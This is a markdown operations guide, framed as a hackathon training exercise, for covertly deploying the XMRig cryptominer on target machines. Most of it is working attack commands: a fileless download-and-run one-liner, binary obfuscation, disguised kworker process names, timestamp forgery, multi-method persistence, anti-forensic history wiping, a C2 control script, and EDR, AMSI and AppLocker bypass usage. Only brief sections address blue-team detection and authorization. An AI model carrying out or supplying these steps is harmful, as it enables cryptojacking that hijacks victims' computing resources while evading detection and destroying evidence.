# XMRig Hackathon - Offensive Operations Guide

**OSCP Offensive Security Hackathon 2025**
**Mission:** Demonstrate real-world cryptominer deployment for defensive training

---

## 🎯 Executive Summary

This guide documents the complete offensive workflow for deploying XMRig cryptocurrency miner as part of a defensive security training exercise. The toolkit demonstrates post-exploitation techniques, evasion methodologies, and persistence mechanisms used by real-world threat actors.

**Objective:** Educate blue team on cryptojacking detection and response through hands-on red team demonstration.

---

## 📦 Toolkit Components

### Directory Structure
```
offensive_toolkit/
├── payloads/
│   └── obfuscate_binary.py       # Binary signature evasion
├── deployment/
│   └── stealth_deploy.sh          # Automated deployment
├── persistence/
│   └── install_persistence.sh     # 7 persistence methods
├── configs/
│   ├── stealth_high.json          # Max stealth (12% CPU)
│   ├── stealth_medium.json        # Balanced (25% CPU)
│   ├── aggressive.json            # Max performance (100% CPU)
│   └── c2_controlled.json         # Remote API control
├── cleanup/
│   └── forensic_cleanup.sh        # Anti-forensics
└── README.md                      # Toolkit documentation
```

---

## 🚀 Deployment Scenarios

### Scenario 1: Quick Deployment (5 minutes)

**Use Case:** Rapid deployment for immediate mining

```bash
# One-liner automated deployment
./offensive_toolkit/deployment/stealth_deploy.sh \
    <WALLET_ADDRESS> \
    pool.supportxmr.com:443
```

**What happens:**
1. Sandbox detection (CPU, RAM, uptime checks)
2. Downloads XMRig v6.24.0
3. Installs as `/opt/.cache/systemd-monitor`
4. Creates stealth config (1 thread, idle priority)
5. Sets up cron persistence
6. Clears deployment tracks
7. Starts mining

**Expected Output:**
```
========================================
  XMRig Stealth Deployment Tool
  OSCP Hackathon 2025
========================================

[+] Wallet: 4xxxxxx...
[+] Pool: pool.supportxmr.com:443

[*] Checking for sandbox environment...
[+] Sandbox checks passed (score: 0/5)

[+] Binary downloaded: /tmp/.download_12345/xmrig
[+] Installed to: /opt/.cache/systemd-monitor
[+] Config created: /opt/.cache/.config.json
[+] Cron job created (user-level)
[+] Miner started successfully (PID: 12345)

========================================
  Deployment Complete!
========================================
```

---

### Scenario 2: Maximum Stealth (20 minutes)

**Use Case:** Long-term persistence with minimal detection risk

#### Step 1: Obfuscate Binary

```bash
cd xmrig-6.24.0

# Obfuscate to evade hash-based detection
python3 ../offensive_toolkit/payloads/obfuscate_binary.py \
    xmrig \
    xmrig_stealth

# Verify changes
sha256sum xmrig xmrig_stealth
# Original: 129cfbfbe4c37a970abab20202639c1481ed0674ff9420d507f6ca4f2ed7796a
# Modified: <DIFFERENT HASH>
```

#### Step 2: Install with Obfuscation

```bash
# Create deeply hidden directory
mkdir -p /usr/local/lib/.fonts/.cache

# Install with kernel-like name
cp xmrig_stealth /usr/local/lib/.fonts/.cache/[kworker/0:1]
chmod +x /usr/local/lib/.fonts/.cache/[kworker/0:1]

# Copy stealth config
cp ../offensive_toolkit/configs/stealth_high.json \
   /usr/local/lib/.fonts/.cache/.config.json

# Edit wallet
sed -i 's/YOUR_WALLET_ADDRESS/<WALLET>/' \
    /usr/local/lib/.fonts/.cache/.config.json

# Timestamp manipulation (match system files)
touch -r /bin/ls /usr/local/lib/.fonts/.cache/[kworker/0:1]
touch -r /bin/ls /usr/local/lib/.fonts/.cache/.config.json
```

#### Step 3: Multi-Layer Persistence

```bash
# Install all user-level persistence methods
../offensive_toolkit/persistence/install_persistence.sh \
    /usr/local/lib/.fonts/.cache/[kworker/0:1] \
    /usr/local/lib/.fonts/.cache/.config.json

# Choose option 8 (Install ALL User Methods)
# This installs:
# - Cron job (reboot + hourly check)
# - .bashrc injection
# - XDG autostart
# - Systemd user service
```

#### Step 4: Execute with Stealth

```bash
# Start with low priority
nice -n 19 ionice -c 3 \
    /usr/local/lib/.fonts/.cache/[kworker/0:1] \
    -c /usr/local/lib/.fonts/.cache/.config.json &

# Verify stealth
ps aux --sort=-%cpu | head -20  # Should be near bottom
top -p $(pgrep kworker)         # Low CPU %
```

#### Step 5: Anti-Forensics

```bash
# Complete track removal
../offensive_toolkit/cleanup/forensic_cleanup.sh

# Select options:
# 4) Clear bash history
# 6) Clear network artifacts
# 7) Remove temporary files
```

---

### Scenario 3: C2-Controlled Botnet Simulation (30 minutes)

**Use Case:** Remote control demonstration for APT-style operations

#### Step 1: Deploy with C2 Config

```bash
# Use C2 configuration
cp offensive_toolkit/configs/c2_controlled.json /tmp/c2_config.json

# Edit credentials
sed -i 's/YOUR_WALLET_ADDRESS/<WALLET>/' /tmp/c2_config.json
sed -i 's/SecretToken123/<RANDOM_TOKEN>/' /tmp/c2_config.json

# Deploy
./offensive_toolkit/deployment/stealth_deploy.sh <WALLET> pool.supportxmr.com:3333
```

#### Step 2: Establish C2 Access

```bash
# Get target IP
TARGET_IP=$(ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v 127)
echo "C2 API: http://${TARGET_IP}:8080"
echo "Token: <RANDOM_TOKEN>"

# Test C2 connectivity
TOKEN="<RANDOM_TOKEN>"
curl -s http://${TARGET_IP}:8080/2/summary \
    -H "Authorization: Bearer ${TOKEN}" | jq .
```

#### Step 3: Remote Control Operations

```bash
# Create C2 control script
cat > c2_control.sh <<'EOF'
#!/bin/bash
TARGET="$1"
TOKEN="$2"
API="http://${TARGET}:8080"

case "$3" in
    status)
        curl -s "$API/2/summary" -H "Authorization: Bearer $TOKEN" | jq .
        ;;
    pause)
        curl -X POST "$API/2/json/stop" -H "Authorization: Bearer $TOKEN"
        echo "[+] Mining paused"
        ;;
    resume)
        curl -X POST "$API/2/json/start" -H "Authorization: Bearer $TOKEN"
        echo "[+] Mining resumed"
        ;;
    throttle)
        # Reduce to 25% CPU
        curl -X POST "$API/2/json/config" \
            -H "Authorization: Bearer $TOKEN" \
            -H "Content-Type: application/json" \
            -d '{"cpu":{"max-threads-hint":25}}'
        echo "[+] Throttled to 25% CPU"
        ;;
    boost)
        # Increase to 75% CPU
        curl -X POST "$API/2/json/config" \
            -H "Authorization: Bearer $TOKEN" \
            -H "Content-Type: application/json" \
            -d '{"cpu":{"max-threads-hint":75}}'
        echo "[+] Boosted to 75% CPU"
        ;;
    *)
        echo "Usage: $0 <target_ip> <token> {status|pause|resume|throttle|boost}"
        ;;
esac
EOF

chmod +x c2_control.sh

# Use C2 control
./c2_control.sh $TARGET_IP $TOKEN status
./c2_control.sh $TARGET_IP $TOKEN throttle
./c2_control.sh $TARGET_IP $TOKEN pause
```

---

## 🛠️ Advanced Techniques

### Technique 1: Process Injection (Advanced)

```bash
# Find legitimate long-running process
TARGET_PID=$(pgrep -o sshd)

# Inject into process memory space (requires custom tooling)
# This is demonstration concept - actual implementation requires:
# - ptrace attachment
# - shellcode injection
# - execution thread creation

# For hackathon, demonstrate concept with documentation
```

### Technique 2: Fileless Execution

```bash
# Download and execute in memory (never touch disk)
wget -q -O - https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz | \
    tar -xzO xmrig-6.24.0/xmrig | \
    bash -c 'cat > /dev/shm/.miner && chmod +x /dev/shm/.miner && /dev/shm/.miner -o pool.supportxmr.com:443 -u WALLET &'

# Advantages:
# - No disk artifacts
# - Lives in RAM (/dev/shm is tmpfs)
# - Harder to detect with file integrity monitoring

# Disadvantage:
# - Lost on reboot (need persistence)
```

### Technique 3: Polymorphic Configuration

```bash
# Generate unique config for each deployment
python3 <<EOF
import json
import random
import sys

config = {
    "background": True,
    "cpu": {"max-threads-hint": random.randint(10, 30)},
    "pools": [{
        "url": "pool.supportxmr.com:443",
        "user": sys.argv[1],
        "pass": "x",
        "tls": True
    }],
    "pause-on-active": random.randint(60, 180)
}

print(json.dumps(config, indent=2))
EOF WALLET > /tmp/polymorphic_config.json
```

---

## 📊 Detection Difficulty Matrix

| Technique | Detection Difficulty | Persistence | Performance |
|-----------|---------------------|-------------|-------------|
| Default XMRig (no modification) | ⭐ Very Easy | Low | High |
| Renamed binary | ⭐⭐ Easy | Medium | High |
| Obfuscated binary | ⭐⭐⭐ Medium | Medium | High |
| Stealth config (low CPU) | ⭐⭐⭐⭐ Hard | High | Low |
| Process injection | ⭐⭐⭐⭐⭐ Very Hard | Low | Medium |
| Fileless + stealth | ⭐⭐⭐⭐⭐ Very Hard | Low | Low |
| Multi-persistence + obfuscation | ⭐⭐⭐⭐ Hard | Very High | Medium |

---

## 🎭 OPSEC Considerations

### Pre-Deployment OPSEC

**Threat Model:**
- Blue team has: Network monitoring, EDR, log aggregation
- Blue team does NOT have: Full packet inspection, memory forensics
- Detection threshold: Sustained >60% CPU = immediate investigation

**Checklist:**
- [ ] Test deployment script in isolated VM
- [ ] Verify sandbox detection works
- [ ] Confirm wallet address valid
- [ ] Ensure pool reachable via TLS
- [ ] Have cleanup script ready
- [ ] Document deployment timeline

### During Deployment

**Avoid:**
- ❌ Using obvious filenames (`xmrig`, `miner`, `crypto`)
- ❌ Max CPU usage immediately
- ❌ Cleartext pool connections
- ❌ Leaving bash history
- ❌ Obvious cron jobs
- ❌ High-privilege escalation attempts

**Do:**
- ✅ Use TLS (port 443 blends with HTTPS)
- ✅ Limit CPU (<30%)
- ✅ Mimic system process names
- ✅ Clear all artifacts
- ✅ Test connectivity before full deployment
- ✅ Monitor for detection signals

### Post-Deployment

**Monitoring:**
```bash
# Check if miner still running
pgrep -f systemd-monitor || echo "DETECTED/KILLED"

# Check network connectivity
netstat -tunap | grep :443 | grep systemd-monitor

# Check CPU usage
ps aux --sort=-%cpu | head -5 | grep systemd-monitor
```

**Detection Indicators:**
- Process killed = likely detected
- Port 3333/4444 blocked = network filtering
- Repeated restarts = persistence detected

---

## 🧪 Testing & Validation

### Test Environment Setup

```bash
# Create isolated test VM
# Recommended: VirtualBox with host-only network

# 1. Deploy on test VM
./offensive_toolkit/deployment/stealth_deploy.sh WALLET pool.supportxmr.com:443

# 2. Verify functionality
ps aux | grep -i miner
netstat -tunap | grep ESTABLISHED

# 3. Test blue team detection
# Run detection scripts from PAYLOAD_ANALYSIS.md

# 4. Test persistence
sudo reboot
# After reboot:
ps aux | grep -i miner  # Should be running

# 5. Test cleanup
./offensive_toolkit/cleanup/forensic_cleanup.sh --auto
ps aux | grep -i miner  # Should be gone
```

### Validation Checklist

**Functionality:**
- [ ] Binary executes without errors
- [ ] Connects to mining pool
- [ ] Hashrate visible (pool dashboard)
- [ ] Persistence survives reboot
- [ ] C2 API responds (if applicable)

**Stealth:**
- [ ] CPU usage <30%
- [ ] Process name non-obvious
- [ ] Network traffic encrypted (TLS)
- [ ] No obvious file artifacts
- [ ] Timestamps match system files

**Cleanup:**
- [ ] All processes terminated
- [ ] Persistence removed
- [ ] Binaries deleted
- [ ] Config files removed
- [ ] Bash history cleared

---

## 📈 Performance Tuning

### Hashrate vs Stealth Trade-off

```
┌─────────────────────────────────────────┐
│ Hashrate vs Detection Risk             │
├─────────────────────────────────────────┤
│ 100% CPU │ ████████████████ │ Max Hash │
│  75% CPU │ ████████████     │ High Hash│
│  50% CPU │ ████████         │ Med Hash │
│  25% CPU │ ████             │ Low Hash │ ← Recommended
│  12% CPU │ ██               │ Very Low │ ← Max Stealth
└─────────────────────────────────────────┘
           Very Risky    ←→    Very Stealth
```

**Recommended Settings:**

**High Stealth (Long-term):**
```json
{
  "cpu": {"max-threads-hint": 12, "priority": 0},
  "pause-on-active": 120
}
```
- Hashrate: ~50 H/s (varies by CPU)
- Detection Risk: Very Low
- Suitable for: Active user workstations

**Balanced:**
```json
{
  "cpu": {"max-threads-hint": 25, "priority": 1},
  "pause-on-active": 60
}
```
- Hashrate: ~200 H/s
- Detection Risk: Low
- Suitable for: Idle workstations, light servers

**Aggressive (Short-term):**
```json
{
  "cpu": {"max-threads-hint": 100, "priority": 3},
  "pause-on-active": 0
}
```
- Hashrate: ~1000+ H/s
- Detection Risk: High
- Suitable for: Servers, short-duration tests

---

## 🛡️ Advanced Evasion Techniques

### Overview

This section documents APT-level evasion techniques added to the toolkit for advanced defensive training scenarios.

### EDR Bypass Framework

**Tool:** `offensive_toolkit/payloads/edr_bypass.py`
**Documentation:** `EDR_BYPASS_TECHNIQUES.md`

**Capabilities:**
- AMSI bypass (5 methods: memory patching, context corruption, reflection)
- ETW evasion (EtwEventWrite patching, provider disable)
- API hook detection (inline JMP, trampoline, IAT hooks)
- EDR process detection (CrowdStrike, SentinelOne, Defender, etc.)
- Direct syscall preparation (Hell's Gate, Halo's Gate)

**Usage:**
```bash
# Full EDR bypass with detection
python3 offensive_toolkit/payloads/edr_bypass.py --all

# Selective bypass
python3 offensive_toolkit/payloads/edr_bypass.py --amsi --etw --detect-hooks
```

### In-Memory Execution

**Tool:** `offensive_toolkit/payloads/stealth_loader.py`
**Requirements:** Windows, pefile, psutil

**Methods:**
1. **Process Injection** - Inject into existing process
2. **Process Hollowing** - Hollow out legitimate process
3. **Reflective DLL Injection** - Load DLL from memory
4. **Direct Memory Execution** - Simple memory execution

**Example:**
```bash
# Process hollowing
python3 offensive_toolkit/payloads/stealth_loader.py \
    --binary xmrig.exe \
    --method hollowing \
    --target-binary "C:\\Windows\\System32\\svchost.exe"
```

### Network Evasion

**Documentation:** `NETWORK_EVASION_C2.md`, `offensive_toolkit/c2/DOMAIN_FRONTING_SETUP.md`

**DNS Tunneling:**
```bash
python3 offensive_toolkit/c2/c2_tunnel.py \
    --pool pool.supportxmr.com \
    --dns 8.8.8.8 \
    --domain tunnel.yourdomain.com \
    --port 3333
```

**DNS over HTTPS:** Integrated in `c2_controlled.json`

**Domain Fronting:** Complete Cloudflare + Nginx setup guide available

### Polymorphic Binary Generation

**Tool:** `offensive_toolkit/payloads/obfuscate_binary_v2.py`

**Features:**
- 4 obfuscation levels
- 5 encoding schemes
- Unique signature per execution
- Multi-layer encryption

**Usage:**
```bash
python3 offensive_toolkit/payloads/obfuscate_binary_v2.py \
    --input xmrig-6.24.0/xmrig \
    --output xmrig_poly.bin \
    --level 4 \
    --polymorphic \
    --iterations 3
```

### AppLocker Bypass

**Tool:** Enhanced `stealth_deploy.sh`

**Methods:**
- MSBuild wrapper generation
- InstallUtil wrapper generation
- Trusted directory deployment

**Usage:**
```bash
export APPLOCKER_BYPASS=true
export BYPASS_METHOD=msbuild
./offensive_toolkit/deployment/stealth_deploy.sh WALLET_ADDRESS
```

### Complete Deployment Scenarios

**Documentation:** `DEPLOYMENT_SCENARIOS.md`

- **Scenario 1:** APT-Level Stealth (Evasion Score: 9/10)
- **Scenario 2:** Quick Opportunistic (Evasion Score: 5/10)
- **Scenario 3:** Network-Evading (Evasion Score: 7/10)
- **Scenario 4:** Long-Term Persistent (Evasion Score: 6/10)
- **Scenario 5:** Domain-Targeted (Evasion Score: 8/10)

---

## 🎬 Hackathon Demonstration Flow

### Timeline: 45 minutes

**Phase 1: Introduction (5 min)**
- Explain threat landscape
- Show real-world cryptojacking stats
- Outline demonstration objectives

**Phase 2: Offensive Deployment (15 min)**
1. Show automated deployment script (5 min)
   - Walk through stealth_deploy.sh code
   - Explain sandbox detection
   - Demonstrate evasion techniques

2. Execute deployment (5 min)
   - Run stealth_deploy.sh
   - Show process hiding
   - Verify network connectivity

3. Establish persistence (5 min)
   - Demonstrate multiple methods
   - Show systemd/cron installation
   - Test reboot persistence

**Phase 3: C2 Control (10 min)**
- Show API endpoints
- Demonstrate remote commands
- Dynamic throttling
- Status monitoring

**Phase 4: Blue Team Detection (10 min)**
- Switch to defensive perspective
- Run detection scripts
- Show IOCs
- Explain detection methods

**Phase 5: Incident Response (5 min)**
- Kill processes
- Remove persistence
- Forensic cleanup
- Post-incident hardening

---

## 📚 Educational Deliverables

### For Red Team:
1. **Deployment Automation:** Fully functional toolkit
2. **Evasion Techniques:** Binary obfuscation, sandbox detection
3. **Persistence Methods:** 7 different mechanisms
4. **OPSEC Documentation:** Operational security best practices

### For Blue Team:
1. **IOC List:** Complete indicators of compromise
2. **Detection Playbook:** Step-by-step detection procedures
3. **YARA Rules:** Binary detection signatures
4. **Sigma Rules:** Log-based detection queries
5. **Incident Response Guide:** Complete eradication steps

---

## ⚠️ Safety & Legal

### Authorized Testing Only

**Before deployment:**
- [ ] Written authorization obtained
- [ ] Scope clearly defined
- [ ] Timeline agreed upon
- [ ] Incident response team notified
- [ ] Cleanup procedure tested

**During operations:**
- [ ] Stay within authorized scope
- [ ] Document all actions
- [ ] Monitor for unintended impact
- [ ] Maintain communication with blue team

**After operations:**
- [ ] Complete cleanup verified
- [ ] Final report delivered
- [ ] Lessons learned documented
- [ ] Recommendations provided

---

## 🔗 References

### Official Documentation
- [XMRig Official Docs](https://xmrig.com/docs)
- [MITRE ATT&CK T1496 - Resource Hijacking](https://attack.mitre.org/techniques/T1496/)

### Toolkit Documentation
- [Toolkit README](./offensive_toolkit/README.md)
- [Payload Analysis](./PAYLOAD_ANALYSIS.md)
- [Hackathon Payload Guide](./HACKATHON_PAYLOAD_GUIDE.md)

### Advanced Evasion Documentation
- [EDR Bypass Techniques](./EDR_BYPASS_TECHNIQUES.md)
- [Advanced Stealth Delivery](./ADVANCED_STEALTH_DELIVERY.md)
- [Network Evasion & C2](./NETWORK_EVASION_C2.md)
- [Domain Fronting Setup](./offensive_toolkit/c2/DOMAIN_FRONTING_SETUP.md)
- [Deployment Scenarios](./DEPLOYMENT_SCENARIOS.md)

### OSCP Evasion Reference
- [AV Evasion Basics](/home/kali/OSCP/evasion/av-evasion-basics.md)
- [AV Evasion Advanced](/home/kali/OSCP/evasion/av-evasion-advanced.md)
- [AppLocker Fundamentals](/home/kali/OSCP/evasion/applocker-fundamentals.md)
- [AppLocker Bypasses](/home/kali/OSCP/evasion/applocker-bypasses.md)
- [Network Filters](/home/kali/OSCP/evasion/network-filters.md)
- [Deep Packet Inspection](/home/kali/OSCP/evasion/deep-packet-inspection.md)

---

**Document Version:** 2.0
**Last Updated:** 2025-10-02
**Classification:** Educational Use Only - Defensive Training Material
**Authorization Required:** Yes

**Changelog:**
- v2.0 (2025-10-02): Added advanced evasion techniques, EDR bypass, in-memory execution, network evasion
- v1.0 (2025-10-02): Initial release with basic deployment toolkit
